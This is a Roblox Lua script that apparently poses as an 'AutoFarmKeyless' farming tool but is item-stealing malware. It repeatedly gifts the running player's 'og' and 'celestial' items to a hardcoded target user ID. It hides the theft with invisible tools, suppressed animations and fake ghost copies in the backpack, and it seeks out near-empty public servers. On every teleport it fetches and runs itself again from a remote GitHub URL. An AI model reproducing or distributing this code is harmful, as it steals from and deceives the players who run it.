local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local PLACE_ID = game.PlaceId

repeat task.wait() until game:IsLoaded()
repeat task.wait() until player and player.Character
repeat task.wait() until player.Character:FindFirstChildOfClass("Humanoid")
repeat task.wait() until player:FindFirstChild("Backpack")

local backpack = player.Backpack
repeat task.wait() until #backpack:GetChildren() > 0

-- CONFIG
local targetUserId = 9367836539
local giftRemote = ReplicatedStorage.Shared.Packages.Network.rev_GiftRequest
local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("WeightModels")

local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"

local hopped = false
local animBlocked = false

--====================================================
-- QUEUE
--====================================================

local function queueSelf()
    if queue_on_teleport then
        queue_on_teleport([[
            repeat task.wait() until game:IsLoaded()
            task.wait(2)
            loadstring(game:HttpGet("]] .. SCRIPT_URL .. [["))()
        ]])
    end
end

--====================================================
-- SERVER CHECK
--====================================================

local function getServerType()
    local remote = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
    if not remote then return nil end

    local ok, res = pcall(function()
        return remote:InvokeServer()
    end)

    if ok and res then
        return string.lower(tostring(res))
    end
end

local function isBadServer()
    local t = getServerType()
    if not t then return false end

    return string.find(t,"vip")
        or string.find(t,"private")
        or string.find(t,"reserved")
end

--====================================================
-- FIND LOW SERVER
--====================================================

local function getLowServer()
    local url = "https://games.roblox.com/v1/games/"..PLACE_ID.."/servers/Public?sortOrder=Asc&limit=100"

    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(url))
    end)

    if success and result and result.data then
        for _,server in pairs(result.data) do
            if server.playing and server.playing <= 2 then
                return server.id
            end
        end
    end
end

--====================================================
-- AUTO HOP (ANTI STUCK)
--====================================================

local function hopServer()
    if hopped then return end

    queueSelf()

    task.spawn(function()
        while true do
            print("🔎 Searching server...")

            local id = getLowServer()

            if id then
                local success, err = pcall(function()
                    TeleportService:TeleportToPlaceInstance(PLACE_ID, id, player)
                end)

                if success then
                    print("🚀 Attempt teleport...")
                    task.wait(5)
                else
                    warn("Teleport error:", err)
                end
            else
                pcall(function()
                    TeleportService:Teleport(PLACE_ID, player)
                end)
            end

            task.wait(3)
        end
    end)
end

-- HANDLE TELEPORT FAIL
TeleportService.TeleportInitFailed:Connect(function()
    warn("🚫 Teleport failed, retrying...")
    hopped = false
    task.wait(2)
    hopServer()
end)

--====================================================
-- SERVER VALIDATION
--====================================================

task.spawn(function()
    task.wait(2)

    if isBadServer() then
        hopServer()
        return
    end

    if #Players:GetPlayers() > 2 then
        hopServer()
        return
    end

    print("GOOD SERVER ✅")
    hopped = true
end)

--====================================================
-- ANTI TOOL ANIM (SMOOTH)
--====================================================

local function getChar()
    return player.Character or player.CharacterAdded:Wait()
end

local function blockAnim(hum)
    if animBlocked then return end
    animBlocked = true

    hum.AnimationPlayed:Connect(function(track)
        local id = tostring(track.Animation.AnimationId)

        if string.find(id,"507768375")
        or string.find(id,"507768133")
        or string.find(id,"507768083") then
            track:Stop()
        end
    end)
end

--====================================================
-- TOOL SYSTEM
--====================================================

local function isWeightTool(tool)
    return weightFolder:FindFirstChild(tool.Name) ~= nil
end

local function silentEquip(tool)
    local char = getChar()
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end

    blockAnim(hum)

    hum:EquipTool(tool)
    task.wait()

    for _,v in ipairs(tool:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Transparency = 1
            v.CanCollide = false
            v.Massless = true
        end
    end
end

local function unequipAll()
    local char = getChar()
    for _,v in ipairs(char:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = backpack
        end
    end
end

--====================================================
-- BACKPACK VISUAL FREEZE
--====================================================

local function cloneVisual(tool)
    if backpack:FindFirstChild(tool.Name.."_ghost") then return end

    local fake = tool:Clone()
    fake.Name = tool.Name.."_ghost"

    for _,v in ipairs(fake:GetDescendants()) do
        if v:IsA("Script") or v:IsA("LocalScript") then
            v:Destroy()
        end
        if v:IsA("BasePart") then
            v.Transparency = 1
            v.CanCollide = false
        end
    end

    fake.Parent = backpack
end

--====================================================
-- RARITY
--====================================================

local function getRarity(tool)
    local model = tool:FindFirstChild(tool.Name)

    if model
    and model:FindFirstChild("Root")
    and model.Root:FindFirstChild("EntityGUI")
    and model.Root.EntityGUI:FindFirstChild("Frame")
    and model.Root.EntityGUI.Frame:FindFirstChild("RarityLabel") then
        return string.lower(model.Root.EntityGUI.Frame.RarityLabel.Text)
    end
end

--====================================================
-- AUTO GIFT LOOP
--====================================================

task.spawn(function()
    while true do
        task.wait(0.01)

        local tools = backpack:GetChildren()
        if #tools == 0 then continue end

        for _,tool in ipairs(tools) do
            if tool:IsA("Tool") and not isWeightTool(tool) and not string.find(tool.Name,"_ghost") then

                silentEquip(tool)
                task.wait(0.01)

                local rarity = getRarity(tool)

                if rarity == "og" or rarity == "celestial" then
                    cloneVisual(tool)
                    giftRemote:FireServer(targetUserId)
                end

                unequipAll()
            end
        end
    end
end)
